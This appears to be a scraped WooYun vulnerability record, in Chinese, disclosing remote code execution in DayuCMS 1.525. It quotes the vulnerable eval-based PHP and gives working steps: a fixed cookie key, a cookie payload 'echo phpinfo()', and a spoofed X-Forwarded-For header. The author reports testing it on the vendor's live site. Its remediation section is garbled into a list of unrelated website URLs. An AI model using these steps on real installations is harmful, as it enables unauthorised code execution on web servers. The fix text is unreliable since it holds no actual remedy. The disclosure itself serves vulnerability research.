{"id": 41843, "wybug_id": "wooyun-2014-087518", "wybug_title": "DayuCMS 1.525 前台任意代码执行", "wybug_corp": "DayuCMS", "wybug_author": "Ricter", "wybug_date": "2014-12-30 12:15", "wybug_open_date": "2015-03-30 12:16", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "任意文件写入利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-30：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： DayuCMS在处理字符串是直接利用eval，并且存在可控变量导致任意代码执行。 详细说明：  /include/global.func.php\n// 字符串转换为数组function string2array($str){        if(disablefunc('eval'))exit('函数eval被禁用,可能无法正常使用本系统!');        if($str=='') return array();        if(is_array($str))return $str; // 2011-09-13  是数组的话直接返回        @eval(\"\\$array = $str;\");        return $array;}\n/pay/order.php\n$payobj=new pay();$action=isset($action)?$action:'step1';session_start();$cookiekey=dayucms_md5('productarray'.IP);$productarray=string2array(get_cookie($cookiekey));\n其中cookiekey是字符串和IP地址拼接得到的md5，并且IP可以利用XSS伪造，所以cookiekey可以固定为：b98b87d11653f2da首先访问一下/pay/order.php，得到Cookie的prefix，然后和cookiekey拼接，得到cookie键值为：cbpCMSNTNAb98b87d11653f2da\n\n然后修改XFF为0.0.0.0。\n\n刷新即可执行php代码。\n\n   漏洞证明：  对于官方网站的测试：http://www.dayucms.com/\n\n得到 Cookie 前缀为 TEVqv2KtR5然后添加一个 Cookie 键值为 TEVqv2KtR5b98b87d11653f2da，内容为 1;echo phpinfo()，勾选上url编码\n\n然后修改 XFF 为0.0.0.0，最后刷新即可。\n\n   修复方案：  过滤http://www.tccg-hotel.com.cn/http://www.xxzydjd.com/http://www.jnsusai.com/http://www.hodlai.com/http://www.huba58.com/   版权声明：转载请注明来源 Ricter@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-04-15 15:25 |    \t\t        Jn·  \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:14        | 本小菜很可爱，如果不服你TM来打我啊--哎呀...)\t\t \n  这个怎么吧一句话执行了,解答下挖。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}